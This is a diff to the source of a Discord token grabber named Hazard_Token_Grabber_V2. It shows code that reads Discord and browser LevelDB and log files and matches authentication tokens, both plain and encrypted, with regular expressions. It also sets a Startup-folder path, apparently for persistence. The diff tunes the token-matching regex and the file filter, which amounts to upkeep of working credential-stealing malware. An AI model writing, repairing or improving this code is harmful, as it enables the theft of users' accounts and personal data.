@@ -79,7 +79,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.dir = mkdtemp()
         self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
+        self.encrypted_regex = r"dQw4w9WgXcQ:(.*?)\""
 
         self.sep = os.sep
         self.tokens = []
@@ -273,7 +273,7 @@ class Hazard_Token_Grabber_V2(functions):
             if "cord" in path:
                 if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
-                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        if file_name[-4:] not in [".log", ".ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
@@ -282,7 +282,7 @@ class Hazard_Token_Grabber_V2(functions):
                                 asyncio.run(self.checkToken(token))
             else:
                 for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    if file_name[-4:] not in [".log", ".ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for regex in (self.regex):
